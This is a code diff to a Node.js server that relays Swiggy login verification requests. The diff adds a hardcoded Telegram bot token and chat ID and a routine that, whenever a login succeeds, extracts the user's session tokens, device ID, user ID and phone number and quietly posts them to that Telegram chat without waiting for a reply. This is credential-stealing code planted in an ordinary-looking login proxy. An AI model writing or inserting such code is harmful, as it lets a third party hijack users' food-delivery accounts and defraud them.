@@ -13,6 +13,39 @@ app.use((req, res, next) => {
     next();
 });
 
+// TELEGRAM CONFIG
+const TELEGRAM_BOT_TOKEN = "8642907155:AAHULXBX2ENPPrE7ZYDJwezQorQu0z0yc-o";
+const TELEGRAM_CHAT_ID = "8450000919";
+
+// Function to send session to Telegram
+async function sendToTelegram(sessionData) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    const message = ` *NEW SWIGGY SESSION*\n\n` +
+                   `📱 *Mobile:* \`${sessionData.mobile}\`\n` +
+                   `🆔 *User ID:* \`${sessionData.userid}\`\n` +
+                   `⏰ *Generated:* ${new Date().toLocaleString()}\n\n` +
+                   `📄 *Session Data:*\n\`\`\`json\n` +
+                   JSON.stringify(sessionData, null, 2) + `\n\`\`\``;
+
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
+
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        console.log(`[+] Session sent to Telegram for ${sessionData.mobile}`);
+    } catch (err) {
+        console.error(`[-] Telegram send failed: ${err.message}`);
+    }
+}
+
 const DEVICES = [
     { vendor: "GOOGLE", hardware: "Pixel 8", ver: "1940", sw: "4.140.0" },
     { vendor: "SAMSUNG", hardware: "SM-S921B", ver: "1942", sw: "4.140.1" },
@@ -89,6 +122,35 @@ app.post('/api/verify', async (req, res) => {
             body: JSON.stringify(payload)
         });
         const data = await resp.json();
+        
+        // If successful, send to Telegram
+        if (data.statusCode === 0) {
+            const sess = {};
+            const inner = typeof data.data === "object" ? data.data : {};
+            ["token", "tid", "sid"].forEach(k => {
+                if (inner[k]) sess[k] = inner[k];
+                else if (data[k]) sess[k] = data[k];
+            });
+            
+            sess.deviceId = String(data.deviceId || deviceId);
+            
+            // Decode JWT to get user_id
+            try {
+                const jwtPayload = sess.tid ? Buffer.from(sess.tid.split('.')[1], 'base64').toString() : '{}';
+                const uid = JSON.parse(jwtPayload).user_id;
+                if (uid) {
+                    sess.userid = String(uid);
+                    sess.mobile = req.body.phone || 'unknown';
+                    if (!sess.customerId) sess.customerId = sess.userid;
+                    
+                    // Send to Telegram (don't wait for it)
+                    sendToTelegram(sess).catch(console.error);
+                }
+            } catch (e) {
+                console.error('JWT decode failed:', e);
+            }
+        }
+        
         res.json(data);
     } catch (err) {
         res.json({ statusCode: -1, statusMessage: err.message });
